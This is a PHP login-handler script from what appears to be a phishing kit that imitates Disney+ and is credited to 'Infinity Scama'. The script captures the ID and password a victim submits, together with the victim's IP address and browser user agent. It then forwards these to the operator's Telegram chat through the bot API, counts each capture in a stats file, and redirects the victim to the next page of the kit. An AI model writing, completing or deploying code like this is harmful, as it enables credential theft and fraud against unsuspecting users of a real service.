<?php
session_start();

include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

if (empty($_SESSION['webhook_set'])) {
    $webhook_url = htmlspecialchars("https://{$_SERVER['HTTP_HOST']}/app/webhook.php");
    $ctx = stream_context_create(['http' => ['timeout' => 3, 'ignore_errors' => true]]);
    @file_get_contents("https://api.telegram.org/bot" . urlencode($telegram['token'])
        . "/setWebhook?url=" . urlencode($webhook_url), false, $ctx);
    $_SESSION['webhook_set'] = 1;
}

$_SESSION['ip'] = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP) ?: ($_SERVER['REMOTE_ADDR'] ?? '');
$_SESSION['ua'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? '');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../../../index.php', true, 302);
    exit();
}

if (empty($_POST['id']) || empty($_POST['password'])) {
    $_SESSION['login-error'] = $errors['2'];
    header('Location: ../', true, 302);
    exit();
}

$_SESSION['id']       = htmlspecialchars($_POST['id']);
$_SESSION['password'] = htmlspecialchars($_POST['password']);

$text = " <b>📩 +1 LOG</b> 
<b>🔑 ID ➟</b> <code>{$_SESSION['id']}</code> 
<b>🔒 Password ➟</b> <code>{$_SESSION['password']}</code> 
<b>🌐 IP Address ➟</b> <code>{$_SESSION['ip']}</code> 
<b>🌐 User Agent ➟</b> <code>{$_SESSION['ua']}</code> 
<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama ♾️ Scama : DISNEY+ ♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

if (isset($telegram['status']) && $telegram['status'] == true) {
    $buttons = array(
        'inline_keyboard' => array(
            array(
                array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                array('text' => '📊 STATS 📊', 'url' => "https://{$_SERVER['HTTP_HOST']}/panel/"),
            ),
        ),
    );
    if (sendMessage($telegram['RezChatId']['log'], $text, $buttons) === false) {
        error_log("Telegram send failed for IP: " . ($_SESSION['ip'] ?? 'n/a'));
    }
}

$sf = '../../../panel/stats.json';
$fh = @fopen($sf, 'c+');
if ($fh) {
    flock($fh, LOCK_EX);
    $raw  = stream_get_contents($fh);
    $data = $raw !== '' ? json_decode($raw, true) : null;
    if (!is_array($data)) $data = [];
    $data['Logs'] = ($data['Logs'] ?? 0) + 1;
    ftruncate($fh, 0); rewind($fh);
    fwrite($fh, json_encode($data, JSON_PRETTY_PRINT));
    fflush($fh); flock($fh, LOCK_UN); fclose($fh);
}

$_SESSION['login-error'] = "";
$_SESSION['login'] = "1";

$next = $_SESSION['id4'] ?? '';
if ($next === '' || !is_dir('../../' . $next)) {
    $next = trim((string)@file_get_contents('../../../id4.txt'));
}
session_write_close();

if ($next !== '' && is_dir('../../' . $next)) {
    header('Location: ../../' . rawurlencode($next) . '/', true, 302);
} else {
    header('Location: ../../../index.php', true, 302);
}
exit();